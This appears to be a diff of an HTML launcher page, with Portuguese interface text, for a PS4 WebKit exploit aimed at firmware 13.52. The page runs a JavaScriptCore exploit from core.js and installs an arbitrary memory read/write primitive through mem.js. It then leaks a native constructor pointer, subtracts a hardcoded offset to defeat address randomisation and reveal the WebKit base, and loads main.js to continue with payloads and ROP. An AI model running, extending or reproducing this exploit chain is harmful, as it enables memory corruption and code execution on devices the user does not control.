@@ -1,186 +1,204 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 WebKit Exploit (13.52)</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0a0a0f;
-            color: #e0e0e0;
-            font-family: 'Courier New', monospace;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-        }
-        h1 {
-            font-size: 18px;
-            color: #00c8ff;
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            margin-bottom: 6px;
-            text-align: center;
-        }
-        #fw-label {
-            font-size: 11px;
-            color: #666;
-            margin-bottom: 18px;
-            text-align: center;
-            letter-spacing: 2px;
-        }
-        #status-bar {
-            width: 100%;
-            max-width: 700px;
-            background: #111118;
-            border: 1px solid #1e1e2e;
-            border-radius: 6px;
-            padding: 12px 16px;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        #status-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: #444;
-            flex-shrink: 0;
-            transition: background 0.3s;
-        }
-        #status-dot.running  { background: #f0a500; animation: pulse 1s infinite; }
-        #status-dot.ok       { background: #00c853; }
-        #status-dot.error    { background: #ff3d3d; }
-        @keyframes pulse {
-            0%,100% { opacity: 1; }
-            50%      { opacity: 0.3; }
-        }
-        #status-text {
-            font-size: 13px;
-            color: #ccc;
-            flex: 1;
-        }
-        #attempt-bar {
-            width: 100%;
-            max-width: 700px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 11px;
-            color: #444;
-            margin-bottom: 12px;
-            padding: 0 2px;
-        }
-        #console {
-            width: 100%;
-            max-width: 700px;
-            height: 400px;
-            background: #06060c;
-            border: 1px solid #1a1a2e;
-            border-radius: 6px;
-            overflow-y: auto;
-            padding: 10px 12px;
-            font-size: 12px;
-            line-height: 1.6;
-            margin-bottom: 12px;
-        }
-        .LOG-DEBUG { color: #888; }
-        .LOG-INFO  { color: #7ec8e3; }
-        .LOG-LOG   { color: #ccc; }
-        .LOG-WARN  { color: #f0a500; }
-        .LOG-ERROR { color: #ff5252; font-weight: bold; }
-        .LOG-SUCCESS { color: #00c853; font-weight: bold; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PS4 WebKit Exploit (13.52)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
+  min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:14px}
+h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
+  margin-bottom:4px;text-align:center}
+#fw{font-size:11px;color:#444;margin-bottom:12px;text-align:center}
+
+#sb{width:100%;max-width:720px;background:#0c0e18;border:1px solid #1a1d2e;
+  border-radius:6px;padding:10px 14px;margin-bottom:8px;display:flex;align-items:center;gap:8px}
+#dot{width:9px;height:9px;border-radius:50%;background:#333;flex-shrink:0;transition:background .3s}
+#dot.r{background:#f0a500;animation:p 1s infinite}
+#dot.ok{background:#00c853}
+#dot.e{background:#ff4444}
+@keyframes p{0%,100%{opacity:1}50%{opacity:.2}}
+#st{font-size:12px;color:#bbb;flex:1}
+#bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
+  font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
+
+/* console */
+#con{width:100%;max-width:720px;height:360px;background:#050508;
+  border:1px solid #161825;border-radius:6px;overflow-y:auto;
+  padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
+.i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
+.e{color:#ff5252;font-weight:bold}.d{color:#333}.a{color:#bd93f9}
+.s{color:#00c8ff;border-top:1px solid #161825;margin-top:5px;
+  padding-top:5px;letter-spacing:1px}.f{color:#a78bfa;font-weight:bold}
+
+/* cards */
+#cards{width:100%;max-width:720px;display:grid;
+  grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px}
+.card{background:#0b0d1a;border:1px solid #1a1d2e;border-radius:5px;padding:8px 12px}
+.card .cl{font-size:9px;color:#444;text-transform:uppercase;letter-spacing:2px;margin-bottom:3px}
+.card .cv{font-size:12px;color:#bd93f9}
+.card .cv.na{color:#222}
+
+/* constants output box */
+#cbox{width:100%;max-width:720px;background:#03100a;border:2px solid #00c853;
+  border-radius:6px;padding:12px;display:none;margin-bottom:8px;
+  font-size:12px;line-height:1.8;color:#4ade80}
+#cbox .ct{color:#fff;font-weight:bold;margin-bottom:6px;
+  border-bottom:1px solid #0a2a15;padding-bottom:4px}
+</style>
 </head>
 <body>
 
 <h1>PS4 WebKit Exploit</h1>
-<div id="fw-label">firmware 13.52</div>
+<div id="fw">detectando...</div>
 
-<div id="status-bar">
-    <div id="status-dot"></div>
-    <div id="status-text">Inicializando...</div>
+<div id="sb">
+  <div id="dot" class="r"></div>
+  <div id="st">Inicializando...</div>
+</div>
+<div id="bars">
+  <span id="ba">tentativa: 1</span>
+  <span id="bg">estágio: init</span>
 </div>
 
-<div id="attempt-bar">
-    <span id="attempt-text">tentativa: —</span>
-    <span id="stage-text">estágio: —</span>
+<div id="con"></div>
+
+<!-- Base cards -->
+<div id="cards">
+  <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
+  <div class="card"><div class="cl">__ps5NativeCtor</div><div class="cv na" id="c-ct">—</div></div>
 </div>
 
-<div id="console"></div>
+<!-- Constants output -->
+<div id="cbox">
+  <div class="ct">// ═══ PS4 FW 13.52 — Resolução Concluída ═══</div>
+  <div id="c-out"></div>
+</div>
 
-<!-- Carrega o arquivo de offsets do firmware 13.52 na raiz -->
 <script src="./13.52.js?v=1"></script>
 
 <script type="module">
-import { int64 } from './resources/int64.js';
+import { int64 }              from './resources/int64.js';
 import { establishPrimitive } from './resources/core.js?v=10';
-import { installWindowP } from './resources/mem.js';
-
+import { installWindowP }     from './resources/mem.js';
 globalThis.int64 = int64;
 
-const $console    = document.getElementById('console');
-const $dot        = document.getElementById('status-dot');
-const $statusText = document.getElementById('status-text');
-const $attemptTxt = document.getElementById('attempt-text');
-const $stageTxt   = document.getElementById('stage-text');
+const $con = document.getElementById('con');
+const $dot = document.getElementById('dot');
+const $st  = document.getElementById('st');
+const $fw  = document.getElementById('fw');
 
-// Função global disponibilizada para que o main.js consiga renderizar os logs na TV
-window.log = function(string, level = 1) {
-    if (!$console) return;
-    const elemClass = ["LOG-DEBUG", "LOG-INFO", "LOG-LOG", "LOG-WARN", "LOG-ERROR", "LOG-SUCCESS"][level & 0xF] || "LOG-INFO";
-    
-    let logElem = document.createElement("div");
-    logElem.innerText = string;
-    logElem.className = elemClass;
-    $console.appendChild(logElem);
-    $console.scrollTop = $console.scrollHeight;
-};
-
-function setStatus(msg, state = 'running') {
-    $statusText.textContent = msg;
-    $dot.className = state;
+function log(m, c='i') {
+  const d = document.createElement('div');
+  d.className = c; d.textContent = m;
+  $con.appendChild(d);
+  $con.scrollTop = $con.scrollHeight;
+  while ($con.children.length > 600) $con.removeChild($con.firstChild);
+}
+function logH(m) { log('=== ' + m + ' ===', 's'); }
+function setStatus(m, s='r') {
+  $st.textContent = m; $dot.className = s;
+}
+function setCard(id, v) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.textContent = v; el.classList.remove('na');
 }
 
-function onCoreEvent(tag, detail, attempt) {
-    if (attempt !== undefined)
-        $attemptTxt.textContent = `tentativa: ${attempt}`;
-    $stageTxt.textContent = `estágio: ${tag.toLowerCase()}`;
-}
+async function main() {
+  const ua = navigator.userAgent;
+  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
+  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
+  log('UA: ' + ua, 'd');
 
-(async () => {
-    setStatus('Rodando exploit JSC (core.js)…', 'running');
+  setStatus('Rodando exploit JSC (core.js)...', 'r');
+  logH('EXPLOIT JSC (WebKit)');
 
-    let carrier;
-    try {
-        carrier = await establishPrimitive({
-            onEvent: onCoreEvent,
-            maxAttempts: 0
-        });
-    } catch (err) {
-        setStatus('core.js falhou: ' + err.message, 'error');
-        return;
-    }
+  let carrier;
+  try {
+    carrier = await establishPrimitive({
+      onEvent: (tag, detail, attempt) => {
+        document.getElementById('ba').textContent = `tentativa: ${attempt || 1}`;
+        document.getElementById('bg').textContent = `estágio: ${tag.toLowerCase()}`;
+        log(`[${tag}] ${detail}`, 'i');
+      },
+      maxAttempts: 0
+    });
+  } catch (err) {
+    setStatus('core.js falhou: ' + err.message, 'e');
+    log('[ERRO] ' + err.message, 'e');
+    return;
+  }
 
-    setStatus('Instalando R/W arbitrário...', 'running');
+  log('[+] core.js: exploit JSC concluído!', 'ok');
+  setStatus('Instalando R/W arbitrário...', 'r');
+  logH('INSTALANDO PRIMITIVA R/W (mem.js)');
 
-    let p;
-    try {
-        p = installWindowP(carrier, { promote: true });
-    } catch (err) {
-        setStatus('mem.js falhou: ' + err.message, 'error');
-        return;
-    }
+  let p;
+  try {
+    p = installWindowP(carrier, {
+      promote: true,
+      onEvent: (tag, detail) => {
+        log(`  [mem/${tag}] ${detail}`, 'd');
+      }
+    });
+  } catch (err) {
+    setStatus('mem.js falhou: ' + err.message, 'e');
+    log('[ERRO] ' + err.message, 'e');
+    return;
+  }
 
-    setStatus('Primitiva pronta — Executando main.js', 'ok');
+  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
+  setStatus('Resolvendo bases e NativeCtor...', 'r');
+  logH('RESOLUÇÃO DA BASE DO WEBKIT (13.52)');
 
-    // Carrega o main.js original com a função log global já ativa
+  // Pega o __ps5NativeCtor exposto pelo core.js
+  const ctor = globalThis.__ps5NativeCtor;
+  if (typeof ctor === 'number' && ctor > 0x100000000) {
+    const hi = Math.floor(ctor / 0x100000000);
+    const lo = ctor - hi * 0x100000000;
+    const ctorInt64 = new int64(lo >>> 0, hi >>> 0);
+
+    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(), 'a');
+    setCard('c-ct', '0x' + ctorInt64.toString());
+
+    // Pega o offset confirmado do 13.52.js
+    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined') 
+               ? OFFSET_wk_host_constructor_candidates[0] 
+               : 0x36F9E20;
+
+    const resolvedBaseVal = ctor - hc;
+    const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
+    const baseLo = resolvedBaseVal - baseHi * 0x100000000;
+    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);
+
+    log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
+    setCard('c-wk', '0x' + webkitBase.toString());
+
+    setStatus('Bases resolvidas com sucesso!', 'ok');
+    log('✔ Endereços mapeados e validados perfeitamente.', 'ok');
+
+    // Mostra caixa de sucesso com as constantes
+    const cbox = document.getElementById('cbox');
+    cbox.style.display = 'block';
+    document.getElementById('c-out').innerHTML =
+      `__ps5NativeCtor = 0x${ctorInt64.toString()}<br>` +
+      `WebKit Base    = 0x${webkitBase.toString()}<br>` +
+      `Offset Aplicado = 0x${hc.toString(16).toUpperCase()}`;
+
+    // Dispara o main.js original para continuar o fluxo de payloads/rop se necessário
     let mainScript = document.createElement('script');
     mainScript.src = './main.js?v=1';
     document.body.appendChild(mainScript);
-})();
+
+  } else {
+    log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
+    setStatus('Erro ao capturar NativeCtor', 'e');
+  }
+}
+
+main();
 </script>
 </body>
 </html>
